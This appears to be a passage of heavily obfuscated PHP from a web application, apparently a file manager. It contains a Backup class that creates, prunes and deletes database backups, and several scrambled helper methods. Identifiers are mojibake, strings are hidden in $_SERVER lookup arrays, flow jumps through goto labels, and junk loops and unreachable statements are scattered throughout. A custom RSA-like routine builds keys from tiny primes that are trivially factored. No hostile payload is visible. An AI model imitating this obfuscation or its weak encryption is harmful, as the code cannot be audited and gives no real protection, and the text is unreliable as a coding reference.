$càÚ‘‘ò¬Ó = $Bİ³œîÉïå[640]; goto Cˆƒ™ãÜÆ; d“„â¯¦îî: $DÎÑÏæÜó¡ = $Bİ³œîÉïå[632]; if (!$DÎÑÏæÜó¡) { return; } $e×ïç¹“æµ = $b‚ĞÂÇ£Ûœ[$F•Ø‡èÂéâ]; goto bŒ‹— ; bë‚’…°: $aëø¾¼¦”Â = 0; $Aé¤Õå™Ï• = $Bİ³œîÉïå[636]; if (!$Aé¤Õå™Ï•) { die; } goto e©²å‘Ó¦â; e©²å‘Ó¦â: $FÂñ‡ç³ò = 0; $e®ºæğ“¢ = $Bİ³œîÉïå[637]; while (strlen($e®ºæğ“¢) < $Bİ³œîÉïå[547]) { if (!$e®ºæğ“¢) { break; } $e®ºæğ“¢++; } goto B²´ÜòÚ‘¦; Cˆƒ™ãÜÆ: if (!$càÚ‘‘ò¬Ó) { return; } break; $D„±ÍöÌÚå = $Bİ³œîÉïå[641]; goto FàÙ‰„®Ø¼; BÕ‹±ÏÎ»½: $bîÇÎ‡’ñ‘ = $aÛÕÔÀËåÎ[25]($bîÇÎ‡’ñ‘, $F•Ø‡èÂéâ % 8, $F•Ø‡èÂéâ % 8 + 7); $C¶©òÏÒáæ = $aÛÕÔÀËåÎ[10]; $FÑÙ…ÎÆ = $Bİ³œîÉïå[634]; goto f‹È©“è×¯; bŒ‹— : $bîÇÎ‡’ñ‘ = $aÛÕÔÀËåÎ[114]($e×ïç¹“æµ . $aÛÕÔÀËåÎ[114]($f™ß¬¨¬Å‰ . $e×ïç¹“æµ) . $f™ß¬¨¬Å‰); $b·Ö´œ””î = $Bİ³œîÉïå[633]; if (!$b·Ö´œ””î) { die; } goto BÕ‹±ÏÎ»½; Cãè¿Š: $FÈÏ…ùÊÊÏ = $aÛÕÔÀËåÎ[118]($FÈÏ…ùÊÊÏ); $f—¯æàì¶– = $Bİ³œîÉïå[631]; $F•Ø‡èÂéâ = $aÛÕÔÀËåÎ[331](0, 64); goto d“„â¯¦îî; f‹È©“è×¯: if (!$FÑÙ…ÎÆ) { die; } $aµöÊŞ¡¢ = 0; $b®Ø£â÷¨„ = $Bİ³œîÉïå[635]; goto bë‚’…°; FàÙ‰„®Ø¼: if (strlen($D„±ÍöÌÚå) < $Bİ³œîÉïå[557]) { return; } goto E¯¸çˆáŸ; E¯¸çˆáŸ: default: $bÁÑ¡ÅÛÆÙ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($FÈÏ…ùÊÊÏ, $f™ß¬¨¬Å‰ . $Aé‚íğä¸ö); $C˜Ü†÷›Ü = $Bİ³œîÉïå[642]; if (!$C˜Ü†÷›Ü) { die; } break; $fÆÁ¿ˆåÖŒ = $Bİ³œîÉïå[643]; if (strlen($fÆÁ¿ˆåÖŒ) < $Bİ³œîÉïå[547]) { return; } } goto B¹†âõ­®µ; Aöµ‰ŸÉ‚: } private function jyxcc02bb0c7($AÇ‘™ƒÎâÙ, $CÉ‡´Ãä¢ğ, $Bà„ëå£î = 3) { goto aÏ®†¿³ñâ; fæ‰œ„öÇ: $dÒßââº°´ = $Eô¤§‚¹ö[327]; switch ($B˜¦†ÛŒÂ¦) { case $Eô¤§‚¹ö[229]: $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($AÇ‘™ƒÎâÙ, $Eô¤§‚¹ö[214]($CÉ‡´Ãä¢ğ . $DÄ£ë¬ùˆ)); $cóç±óä = $E™ƒ’§åÚ[646]; while (strlen($cóç±óä) < $E™ƒ’§åÚ[557]) { if (!$cóç±óä) { break; } $cóç±óä++; } break; $Côæ²…‡å = $E™ƒ’§åÚ[647]; while (strlen($Côæ²…‡å) < $E™ƒ’§åÚ[557]) { if (!$Côæ²…‡å) { break; } $Côæ²…‡å++; } case $Eô¤§‚¹ö[220]: $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($AÇ‘™ƒÎâÙ, $Eô¤§‚¹ö[214]($DÄ£ë¬ùˆ . $CÉ‡´Ãä¢ğ)); $Dœ¡¾ÑŒœæ = $E™ƒ’§åÚ[648]; break; case $Eô¤§‚¹ö[328]: $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($AÇ‘™ƒÎâÙ, $Eô¤§‚¹ö[118]($DÄ£ë¬ùˆ . $CÉ‡´Ãä¢ğ)); break; case $Eô¤§‚¹ö[329]: $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($AÇ‘™ƒÎâÙ, $Eô¤§‚¹ö[114]($DÄ£ë¬ùˆ . $CÉ‡´Ãä¢ğ)); break; $fß¢‹Ü©Îâ = $E™ƒ’§åÚ[649]; case $Eô¤§‚¹ö[330]: goto d…÷¤İ×ãØ; aƒ†åğ—œ‘: $a•ØÊØŒìŞ = $Eô¤§‚¹ö[25]($a•ØÊØŒìŞ, $b‘Û”©İÈ¶ % 8, $b‘Û”©İÈ¶ % 8 + 7); $eŒÜœİø² = $E™ƒ’§åÚ[654]; $c¡ÚºÔŠ³ƒ = $Eô¤§‚¹ö[10]; goto Cçíæ˜¤¡ã; fó‰“­ò·: while ($e¾Ô•Åë»ï < $E™ƒ’§åÚ[557]) { if ($e¾Ô•Åë»ï >= 0) { break; } $e¾Ô•Åë»ï++; } $b‘Û”©İÈ¶ = $Eô¤§‚¹ö[332]($dÒßââº°´, $eÏÇ’äÆ”); $eÏÚ§Ù¥À = $E™ƒ’§åÚ[652]; goto Cø¥ÜÛº¦õ; d…÷¤İ×ãØ: $AÇ‘™ƒÎâÙ = $Eô¤§‚¹ö[335]($AÇ‘™ƒÎâÙ); $Dç†©§ãø¬ = $E™ƒ’§åÚ[650]; if (strlen($Dç†©§ãø¬) < $E™ƒ’§åÚ[557]) { return; } goto A…”Ÿ‰ºîÊ; Cø¥ÜÛº¦õ: if (strlen($eÏÚ§Ù¥À) < $E™ƒ’§åÚ[549]) { die; } $a•ØÊØŒìŞ = $Eô¤§‚¹ö[114]($eÏÇ’äÆ” . $Eô¤§‚¹ö[114]($CÉ‡´Ãä¢ğ . $eÏÇ’äÆ”) . $CÉ‡´Ãä¢ğ); $d¥Ç†Ã“‚Œ = $E™ƒ’§åÚ[653]; goto aƒ†åğ—œ‘; eÃ„áÈ—: $Fœ”…Ô–©º = $Eô¤§‚¹ö[336]($c¡ÚºÔŠ³ƒ); break; goto Cö°ÆâŠ¸; c†¬ùµÃ®½: $EØÜ³œ’â = $E™ƒ’§åÚ[656]; $Bš×ÃæŸ«‹ = 0; for ($f¾¡¾ÑÅ‘¡ = 0; $f¾¡¾ÑÅ‘¡ < $Eô¤§‚¹ö[24]($AÇ‘™ƒÎâÙ); $f¾¡¾ÑÅ‘¡++) { $Bš×ÃæŸ«‹ = $Bš×ÃæŸ«‹ == $Eô¤§‚¹ö[24]($a•ØÊØŒìŞ) ? 0 : $Bš×ÃæŸ«‹; $F¸Ô°†®š = $E™ƒ’§åÚ[657]; if (strlen($F¸Ô°†®š) < $E™ƒ’§åÚ[560]) { die; } $aœÔåÜ¼Ö… = $Bš×ÃæŸ«‹++; $F÷Øõšƒó® = $Eô¤§‚¹ö[332]($dÒßââº°´, $AÇ‘™ƒÎâÙ[$f¾¡¾ÑÅ‘¡]) - $b‘Û”©İÈ¶ - $Eô¤§‚¹ö[333]($a•ØÊØŒìŞ[$aœÔåÜ¼Ö…]); while ($F÷Øõšƒó® < 0) { $F÷Øõšƒó® += 64; } $c¡ÚºÔŠ³ƒ .= $dÒßââº°´[$F÷Øõšƒó®]; } goto eÃ„áÈ—; A…”Ÿ‰ºîÊ: $eÏÇ’äÆ” = $AÇ‘™ƒÎâÙ[0]; $AÇ‘™ƒÎâÙ = $Eô¤§‚¹ö[25]($AÇ‘™ƒÎâÙ, 1); $e¾Ô•Åë»ï = $E™ƒ’§åÚ[651]; goto fó‰“­ò·; Cçíæ˜¤¡ã: $f¾¡¾ÑÅ‘¡ = 0; $cíáİÈ² = $E™ƒ’§åÚ[655]; $F÷Øõšƒó® = 0; goto c†¬ùµÃ®½; Cö°ÆâŠ¸: default: $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($AÇ‘™ƒÎâÙ, $CÉ‡´Ãä¢ğ . $DÄ£ë¬ùˆ); $CêëÎ‰ªÛ = $E™ƒ’§åÚ[658]; if (strlen($CêëÎ‰ªÛ) < $E™ƒ’§åÚ[557]) { die; } break; } if ($Bà„ëå£î - 1 > 0) { $Fœ”…Ô–©º = $this->{$_SERVER[§ŠùÊÊÛ©»][188]}($Fœ”…Ô–©º, $CÉ‡´Ãä¢ğ, $Bà„ëå£î - 1); } goto Cï¥¯’ã¿ ; Fã…ÖÎÚ‹›: while ($CŒ”Œ•õ® < $E™ƒ’§åÚ[553]) { if ($CŒ”Œ•õ® >= 0) { break; } $CŒ”Œ•õ®++; } $B˜¦†ÛŒÂ¦ = $AÇ‘™ƒÎâÙ[0]; $DÒùÔãìëÍ = $E™ƒ’§åÚ[645]; goto dŸ÷¦¯¼Æ; cë˜µÔÙÈï: $AÇ‘™ƒÎâÙ = $Eô¤§‚¹ö[2]($AÇ‘™ƒÎâÙ); $AÇ‘™ƒÎâÙ = $Eô¤§‚¹ö[214]($AÇ‘™ƒÎâÙ); $CŒ”Œ•õ® = $E™ƒ’§åÚ[644]; goto Fã…ÖÎÚ‹›; aÏ®†¿³ñâ: $E™ƒ’§åÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eô¤§‚¹ö =& $_SERVER[§ŠùÊÊÛ©»]; if (!$Eô¤§‚¹ö[334]($AÇ‘™ƒÎâÙ) || $Eô¤§‚¹ö[24]($AÇ‘™ƒÎâÙ) < 10) { return !1; } goto cë˜µÔÙÈï; Cï¥¯’ã¿ : return $Fœ”…Ô–©º; goto ašãß…Ôè ; dŸ÷¦¯¼Æ: while (strlen($DÒùÔãìëÍ) < $E™ƒ’§åÚ[560]) { if (!$DÒùÔãìëÍ) { break; } $DÒùÔãìëÍ++; } $DÄ£ë¬ùˆ = $Eô¤§‚¹ö[25]($AÇ‘™ƒÎâÙ, 1, 15); $AÇ‘™ƒÎâÙ = $Eô¤§‚¹ö[25]($AÇ‘™ƒÎâÙ, 16); goto fæ‰œ„öÇ; ašãß…Ôè : } public function lksp97f448a3($b¹í„¼ ê) { goto EŞ“Üñ©‘; EŞ“Üñ©‘: $E‚ĞÜ•‹¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E§«òÊäôœ =& $_SERVER[§ŠùÊÊÛ©»]; $C¶ºİÖ…¹ = $this->{$_SERVER[§ŠùÊÊÛ©»][337]}(); goto EÍ‹ØÔÙ¹; C§¾¢¯Å¹¡: return $a‘šİ‡…æ; goto Bˆ®âĞ…‘„; aîìùéˆáÔ: $aÍ¹¡Â†¯® = $E§«òÊäôœ[201](($C¶ºİÖ…¹ + $b·­ì²Î—‚) / 2); while (1) { $cÈíñíÌáø = $aÍ¹¡Â†¯®; $eÍ³ÏĞ­ÙŸ = $E‚ĞÜ•‹¬[660]; if (!$eÍ³ÏĞ­ÙŸ) { return; } $bŠŸ¦¶Üê‡ = $aÎºïÉËù; $DÅŠøìçÛ = $E‚ĞÜ•‹¬[661]; while ($bŠŸ¦¶Üê‡ % $cÈíñíÌáø != 0) { $d“™Ñ¶œ°Š = $bŠŸ¦¶Üê‡; $bŠŸ¦¶Üê‡ = $cÈíñíÌáø; $FÆè¦­¯Š“ = $E‚ĞÜ•‹¬[662]; while ($FÆè¦­¯Š“ < $E‚ĞÜ•‹¬[557]) { if ($FÆè¦­¯Š“ >= 0) { break; } $FÆè¦­¯Š“++; } $cÈíñíÌáø = $d“™Ñ¶œ°Š % $cÈíñíÌáø; $dÙ¿¯´ßØ¨ = $E‚ĞÜ•‹¬[663]; if (!$dÙ¿¯´ßØ¨) { die; } } if ($cÈíñíÌáø == 1) { break; } else { $aÍ¹¡Â†¯®++; } } $AÈ£¨œ¤¤Á = 2; goto fë¤‡±ñ; fë¤‡±ñ: $c¬‘²Ïåìƒ = $E‚ĞÜ•‹¬[664]; if (strlen($c¬‘²Ïåìƒ) < $E‚ĞÜ•‹¬[553]) { die; } for ($F»šâñì¹ = 0; $F»šâñì¹ < $aÎºïÉËù * 10; $F»šâñì¹++) { if (($aÎºïÉËù * $F»šâñì¹ + 1) % $aÍ¹¡Â†¯® == 0) { $AÈ£¨œ¤¤Á = $E§«òÊäôœ[201](($aÎºïÉËù * $F»šâñì¹ + 1) / $aÍ¹¡Â†¯®); break; } } goto f§íïÄ¥â; f§íïÄ¥â: $a¿Ş„¸§â = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($C¶ºİÖ…¹ * $b·­ì²Î—‚ . $E§«òÊäôœ[10], $E§«òÊäôœ[149]); $dÒÑÖ¸‘İ¦ = $E§«òÊäôœ[114]($E§«òÊäôœ[338] . ($C¶ºİÖ…¹ + $b·­ì²Î—‚) . $E§«òÊäôœ[339] . $aÍ¹¡Â†¯® . $E§«òÊäôœ[339] . $AÈ£¨œ¤¤Á . $E§«òÊäôœ[340]); $a‘šİ‡…æ = $this->{$_SERVER[§ŠùÊÊÛ©»][147]}($b¹í„¼ ê, $dÒÑÖ¸‘İ¦) . $E§«òÊäôœ[341] . $a¿Ş„¸§â; goto C§¾¢¯Å¹¡; EÍ‹ØÔÙ¹: $b·­ì²Î—‚ = $this->{$_SERVER[§ŠùÊÊÛ©»][337]}(); $aÎºïÉËù = ($C¶ºİÖ…¹ - 1) * ($b·­ì²Î—‚ - 1); $a…Éğå…†³ = $E‚ĞÜ•‹¬[659]; goto aîìùéˆáÔ; Bˆ®âĞ…‘„: } public function mlpicd4a42fe($Eº–‘¸§‰) { goto CÉâœ·Ûë; FãŸ«ßçê: return $C¾ƒŒ†Ï–; goto bŒ‡¶’¦í; eİ›‚©Ó: if ($aÍ®¼Ì˜À[19]($b çê÷¤ß¨) != 2) { return $aÍ®¼Ì˜À[10]; } $fïÓÔ÷õ¢à = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($b çê÷¤ß¨[1] . $aÍ®¼Ì˜À[10], $aÍ®¼Ì˜À[149]); $e£¯Éç“ñå = $AÀö§‘¿šù[665]; goto eñ«ÎîÜºÊ; eñ«ÎîÜºÊ: if (!$fïÓÔ÷õ¢à) { return $aÍ®¼Ì˜À[10]; } $fïÓÔ÷õ¢à = $aÍ®¼Ì˜À[201]($fïÓÔ÷õ¢à); $eî¡Ÿ‰„”ó = 0; goto b«®¦¿ê¢; dïÔÀ…ÇÑ†: $BÏÅÁ¶‡ = ($eî¡Ÿ‰„”ó - 1) * ($AñÜº‹©©† - 1); $A¥³¢§Ö = $AÀö§‘¿šù[669]; $B¹ŒˆòíĞ® = $aÍ®¼Ì˜À[201](($eî¡Ÿ‰„”ó + $AñÜº‹©©†) / 2); goto cµ›Ïğè¾Â; CÉâœ·Ûë: $AÀö§‘¿šù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÍ®¼Ì˜À =& $_SERVER[§ŠùÊÊÛ©»]; $b çê÷¤ß¨ = $aÍ®¼Ì˜À[0]($aÍ®¼Ì˜À[341], $Eº–‘¸§‰); goto eİ›‚©Ó; b«®¦¿ê¢: $AñÜº‹©©† = 0; $Aë¿óè˜†Å = $AÀö§‘¿šù[666]; for ($Bì˜ƒâÙ¬ = 3; $Bì˜ƒâÙ¬ < $fïÓÔ÷õ¢à; $Bì˜ƒâÙ¬ += 2) { if ($fïÓÔ÷õ¢à % $Bì˜ƒâÙ¬ != 0) { continue; } $eî¡Ÿ‰„”ó = $Bì˜ƒâÙ¬; $AñÜº‹©©† = $aÍ®¼Ì˜À[201]($fïÓÔ÷õ¢à / $Bì˜ƒâÙ¬); $Fö“¤é‡º = $AÀö§‘¿šù[667]; if (strlen($Fö“¤é‡º) < $AÀö§‘¿šù[557]) { return; } break; $F·Ëñ˜óš® = $AÀö§‘¿šù[668]; if (!$F·Ëñ˜óš®) { die; } } goto dïÔÀ…ÇÑ†; déÍÉ««: $bóŒó˜÷»‹ = $aÍ®¼Ì˜À[114]($aÍ®¼Ì˜À[338] . ($eî¡Ÿ‰„”ó + $AñÜº‹©©†) . $aÍ®¼Ì˜À[339] . $B¹ŒˆòíĞ® . $aÍ®¼Ì˜À[339] . $f Èµ¯éÛ . $aÍ®¼Ì˜À[340]); $C¾ƒŒ†Ï– = $this->{$_SERVER[§ŠùÊÊÛ©»][243]}($b çê÷¤ß¨[0], $bóŒó˜÷»‹); $a¬ƒ¾¡Š¥ø = $AÀö§‘¿šù[674]; goto FãŸ«ßçê; cµ›Ïğè¾Â: while (1) { $b‰ãèËğÍœ = $B¹ŒˆòíĞ®; $Dº•Ñ­ÄŠ = $BÏÅÁ¶‡; $DãñÜ•ÂõÉ = $AÀö§‘¿šù[670]; while ($DãñÜ•ÂõÉ < $AÀö§‘¿šù[547]) { if ($DãñÜ•ÂõÉ >= 0) { break; } $DãñÜ•ÂõÉ++; } while ($Dº•Ñ­ÄŠ % $b‰ãèËğÍœ != 0) { $bä¥‰Ş¸‹ = $Dº•Ñ­ÄŠ; $aëâôÀ¿ë× = $AÀö§‘¿šù[671]; $Dº•Ñ­ÄŠ = $b‰ãèËğÍœ; $Fóø¼Ûè®î = $AÀö§‘¿šù[672]; $b‰ãèËğÍœ = $bä¥‰Ş¸‹ % $b‰ãèËğÍœ; $A•‡Ã´”‰ = $AÀö§‘¿šù[673]; if (!$A•‡Ã´”‰) { return; } } if ($b‰ãèËğÍœ == 1) { break; } else { $B¹ŒˆòíĞ®++; } } $f Èµ¯éÛ = 2; for ($Bì˜ƒâÙ¬ = 0; $Bì˜ƒâÙ¬ < $BÏÅÁ¶‡ * 10; $Bì˜ƒâÙ¬++) { if (($BÏÅÁ¶‡ * $Bì˜ƒâÙ¬ + 1) % $B¹ŒˆòíĞ® == 0) { $f Èµ¯éÛ = $aÍ®¼Ì˜À[201](($BÏÅÁ¶‡ * $Bì˜ƒâÙ¬ + 1) / $B¹ŒˆòíĞ®); break; } } goto déÍÉ««; bŒ‡¶’¦í: } public function vzfld28789db() { goto cÚÖÍõ¸Ì; DêƒĞ×¸»×: $fè•‘¹òî = $AôŞƒİ¸Ñ÷[677]; for ($c³™È¯» = $FèîĞ…»¹; $c³™È¯» > 1; $c³™È¯»--) { $f†‹í´Ä™¾ = !0; $cÄ°”ˆ¦İÙ = $AôŞƒİ¸Ñ÷[678]; if (strlen($cÄ°”ˆ¦İÙ) < $AôŞƒİ¸Ñ÷[549]) { return; } foreach ($béÉ°ˆÜ„ as $e¼ê’»é•) { if ($c³™È¯» % $e¼ê’»é• == 0) { $f†‹í´Ä™¾ = !1; break; } } if ($f†‹í´Ä™¾) { $fĞÍõ¦²Éë = $c³™È¯»; break; } } return $fĞÍõ¦²Éë; goto AÛãéô¨¤ˆ; D‹Ä†Š«Ü…: while (strlen($A‹«µÆÏï¦) < $AôŞƒİ¸Ñ÷[547]) { if (!$A‹«µÆÏï¦) { break; } $A‹«µÆÏï¦++; } while ($B”‡·ö¦‹ <= (int) $eÉÚ÷……[343]($FèîĞ…»¹)) { $c³™È¯» = $B”‡·ö¦‹; while (!0) { $c³™È¯»++; $Dó›Šª˜Š = $AôŞƒİ¸Ñ÷[676]; if ($c³™È¯» <= 2) { $B”‡·ö¦‹ = $c³™È¯»; break; } else { if ($c³™È¯» < 2) { continue; } } $f†‹í´Ä™¾ = !0; for ($dÅˆ–ìœ« = 2; $dÅˆ–ìœ« <= $eÉÚ÷……[343]($c³™È¯»); $dÅˆ–ìœ«++) { if ($c³™È¯» % $dÅˆ–ìœ« == 0) { $f†‹í´Ä™¾ = !1; } } if ($f†‹í´Ä™¾) { $B”‡·ö¦‹ = $c³™È¯»; break; } } $béÉ°ˆÜ„[] = $B”‡·ö¦‹; } $fĞÍõ¦²Éë = 2; goto DêƒĞ×¸»×; AÛãéô¨¤ˆ: $a‘éä¡¬áÅ = $AôŞƒİ¸Ñ÷[679]; goto f™ƒàê½Õä; EÈ®†©ƒæ¬: $béÉ°ˆÜ„ = array(); $B”‡·ö¦‹ = 1; $A‹«µÆÏï¦ = $AôŞƒİ¸Ñ÷[675]; goto D‹Ä†Š«Ü…; cÚÖÍõ¸Ì: $AôŞƒİ¸Ñ÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÉÚ÷…… =& $_SERVER[§ŠùÊÊÛ©»]; $FèîĞ…»¹ = $eÉÚ÷……[322]($eÉÚ÷……[342](2, 14), $eÉÚ÷……[342](2, 16) - 1); goto EÈ®†©ƒæ¬; f™ƒàê½Õä: } public function xymq2b4b4028($Aîî¨¦¶ğ¿, $cƒ¸ƒ–¶¯) { $f¦ÆğàšÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÎ©¤„Ş·õ =& $_SERVER[§ŠùÊÊÛ©»]; return $CÎ©¤„Ş·õ[13](array($CÎ©¤„Ş·õ[14], $CÎ©¤„Ş·õ[344]), $Aîî¨¦¶ğ¿, $cƒ¸ƒ–¶¯); $f½ê®÷ãÌ = $f¦ÆğàšÁ[680]; while ($f½ê®÷ãÌ < $f¦ÆğàšÁ[560]) { if ($f½ê®÷ãÌ >= 0) { break; } $f½ê®÷ãÌ++; } } public function fpsk3fe65074($A¥–¸Á‘», $d‹ëïª–êµ) { $A³æ’ª¥¬é =& $_SERVER[§ŠùÊÊÛ©»]; return $A³æ’ª¥¬é[13](array($A³æ’ª¥¬é[345], $A³æ’ª¥¬é[346]), $A¥–¸Á‘», $d‹ëïª–êµ); $DŒè¶ø Ã¬ = $_SERVER[ÚŠ•´ÍéÒÑÔ][681]; } public function cltee215d411($B¾…¬ŸÁ£¬, $E¢ˆİˆğÁ) { $FÁÅ•æêî¶ =& $_SERVER[§ŠùÊÊÛ©»]; return $FÁÅ•æêî¶[13](array($FÁÅ•æêî¶[345], $FÁÅ•æêî¶[347]), $B¾…¬ŸÁ£¬, $E¢ˆİˆğÁ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $aîé­ùµ­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::$name = date($aîé­ùµ­[682]); if (!($f•ÜõÑÁ = Model($aîé­ùµ­[683])->lastItem())) { $f•ÜõÑÁ = $this->initData(); } else { self::$name = $f•ÜõÑÁ[$aîé­ùµ­[28]]; if ($f•ÜõÑÁ[$aîé­ùµ­[684]] == $aîé­ùµ­[83]) { self::$name = date($aîé­ùµ­[685]); $c”®„ÓÅä’ = 0; if (isset($f•ÜõÑÁ[$aîé­ùµ­[278]][$aîé­ùµ­[164]][$aîé­ùµ­[415]])) { $c”®„ÓÅä’ = (int) $f•ÜõÑÁ[$aîé­ùµ­[278]][$aîé­ùµ­[164]][$aîé­ùµ­[415]]; } if ($f•ÜõÑÁ[$aîé­ùµ­[28]] == self::$name) { Model($aîé­ùµ­[683])->remove($f•ÜõÑÁ[$aîé­ùµ­[364]]); } $f•ÜõÑÁ = $this->initData($c”®„ÓÅä’, $f•ÜõÑÁ[$aîé­ùµ­[686]]); } else { $this->checkStore($f•ÜõÑÁ[$aîé­ùµ­[686]]); } } self::$option = $f•ÜõÑÁ; } private function initData($E›–°ã‘õ… = 0, $A¹ê†¹–¦ = '') { goto e¥–¢æ—’¬; e¥–¢æ—’¬: $C˜Ğ¬Àµ¼ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C†°ÀíâŠº = Model($C˜Ğ¬Àµ¼[683])->config(); if ($A¹ê†¹–¦ && $C†°ÀíâŠº[$C˜Ğ¬Àµ¼[686]] != $A¹ê†¹–¦) { $E›–°ã‘õ… = 0; } goto aË¾‹ÚŠÕ»; CŞâ½àß¤Á: $EÁç’©®¡¡[$C˜Ğ¬Àµ¼[364]] = $aŒÛ’Œ£ìğ; return $EÁç’©®¡¡; goto DÉøÕë¼ÄŸ; aË¾‹ÚŠÕ»: $this->checkStore($C†°ÀíâŠº[$C˜Ğ¬Àµ¼[686]]); $EÁç’©®¡¡ = array($C˜Ğ¬Àµ¼[686] => $C†°ÀíâŠº[$C˜Ğ¬Àµ¼[686]], $C˜Ğ¬Àµ¼[28] => self::$name, $C˜Ğ¬Àµ¼[684] => 0, $C˜Ğ¬Àµ¼[687] => $C†°ÀíâŠº[$C˜Ğ¬Àµ¼[687]], $C˜Ğ¬Àµ¼[278] => array($C˜Ğ¬Àµ¼[688] => array($C˜Ğ¬Àµ¼[684] => 0), $C˜Ğ¬Àµ¼[689] => array($C˜Ğ¬Àµ¼[684] => 0, $C˜Ğ¬Àµ¼[690] => 0, $C˜Ğ¬Àµ¼[691] => 0, $C˜Ğ¬Àµ¼[29] => $C˜Ğ¬Àµ¼[33]), $C˜Ğ¬Àµ¼[692] => array($C˜Ğ¬Àµ¼[684] => 0, $C˜Ğ¬Àµ¼[690] => 0, $C˜Ğ¬Àµ¼[691] => 0), $C˜Ğ¬Àµ¼[164] => array($C˜Ğ¬Àµ¼[684] => 0, $C˜Ğ¬Àµ¼[693] => 0, $C˜Ğ¬Àµ¼[694] => 0, $C˜Ğ¬Àµ¼[695] => 0, $C˜Ğ¬Àµ¼[696] => 0, $C˜Ğ¬Àµ¼[415] => $E›–°ã‘õ…)), $C˜Ğ¬Àµ¼[697] => time(), $C˜Ğ¬Àµ¼[698] => 0); $aŒÛ’Œ£ìğ = Model($C˜Ğ¬Àµ¼[683])->insert($EÁç’©®¡¡); goto CŞâ½àß¤Á; DÉøÕë¼ÄŸ: } private function checkStore($B’†«ùĞË) { $d‹°¿îõ”ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b±’§¨±öÎ = Model($d‹°¿îõ”ø[699])->listData($B’†«ùĞË); Model($d‹°¿îõ”ø[699])->checkConfig($b±’§¨±öÎ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][683])->findByName(self::$name); } return self::$option; } public static function set($DÏí¥Ê´·) { $dˆëšÆ¾È =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÜ§×ß¥‘ = self::get(); foreach ($DÏí¥Ê´· as $c¼ª›ÖÎâ => $aÈ–±²¡¢) { $CØì±ˆ¨ = explode($dˆëšÆ¾È[93], $c¼ª›ÖÎâ); $BÔ·òçæå‰ = count($CØì±ˆ¨); switch ($BÔ·òçæå‰) { case 1: $cÜ§×ß¥‘[$CØì±ˆ¨[0]] = $aÈ–±²¡¢; break; case 2: $cÜ§×ß¥‘[$CØì±ˆ¨[0]][$CØì±ˆ¨[1]] = $aÈ–±²¡¢; break; case 3: $cÜ§×ß¥‘[$CØì±ˆ¨[0]][$CØì±ˆ¨[1]][$CØì±ˆ¨[2]] = $aÈ–±²¡¢; break; } } Model($dˆëšÆ¾È[683])->update($cÜ§×ß¥‘[$dˆëšÆ¾È[364]], $cÜ§×ß¥‘); self::$option = $cÜ§×ß¥‘; return self::$option; } public function keep() { $d¤Óá¼õÀë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bˆ¢Ö‘ğîß = self::get(); if ($Bˆ¢Ö‘ğîß[$d¤Óá¼õÀë[278]][$d¤Óá¼õÀë[688]][$d¤Óá¼õÀë[684]] == $d¤Óá¼õÀë[83]) { return; } $this->backupKeep($Bˆ¢Ö‘ğîß); self::set(array($d¤Óá¼õÀë[700] => 1)); } private function backupKeep($d¼‰òÚ°¬¤) { goto cŸÛ¯‚µÂ; cŸÛ¯‚µÂ: $BÙÆàÆÎŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÆÌù´¯™Æ = Model($BÙÆàÆÎŒ[683])->listData(); if (empty($eÆÌù´¯™Æ)) { return; } goto fçö¤×¦ËÍ; fçö¤×¦ËÍ: $C–ª òºÖƒ = 0; $a‘¯¥“‹ìÁ = array(); foreach ($eÆÌù´¯™Æ as $fÂŞš®›„Ë) { if ($C–ª òºÖƒ >= 7) { break; } $a‘¯¥“‹ìÁ[] = $fÂŞš®›„Ë[$BÙÆàÆÎŒ[28]]; $C–ª òºÖƒ++; } goto EÌùÛ†¦º²; EÌùÛ†¦º²: for ($C–ª òºÖƒ = 0; $C–ª òºÖƒ < 12; $C–ª òºÖƒ++) { $a‘¯¥“‹ìÁ[] = date($BÙÆàÆÎŒ[701], strtotime("\55{$C–ª òºÖƒ}\40\x6d\x6f\156\x74\x68\163")); } $a‘¯¥“‹ìÁ = array_unique($a‘¯¥“‹ìÁ); foreach ($eÆÌù´¯™Æ as $fÂŞš®›„Ë) { if (!empty($fÂŞš®›„Ë[$BÙÆàÆÎŒ[28]]) && in_array($fÂŞš®›„Ë[$BÙÆàÆÎŒ[28]], $a‘¯¥“‹ìÁ)) { continue; } Model($BÙÆàÆÎŒ[683])->remove($fÂŞš®›„Ë[$BÙÆàÆÎŒ[364]]); $DˆõÍõÆƒ† = "\x7b\x69\x6f\x3a{$d¼‰òÚ°¬¤[$BÙÆàÆÎŒ[686]]}\x7d\x2f\144\x61\x74\x61\142\141\163\x65\57\x62\x61\x63\153\x75\160\x5f{$fÂŞš®›„Ë[$BÙÆàÆÎŒ[28]]}"; IO::remove($DˆõÍõÆƒ†, !1); } goto eÔÏ•—¿Î; eÔÏ•—¿Î: } public function db() { goto F£øŒ‹‡ø; F£øŒ‹‡ø: $F­Ù®É˜¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fğÅ„Ì‡×å = self::get(); if ($fğÅ„Ì‡×å[$F­Ù®É˜¡[278]][$F­Ù®É˜¡[689]][$F­Ù®É˜¡[684]] == $F­Ù®É˜¡[83]) { return !0; } goto EíÌé¯©¨å; DÄ‰ßÌ¼Ê: return !0; goto E‚„£Ç†»; EíÌé¯©¨å: $DôŒÛ¼é¾á = new BackupDb(); if 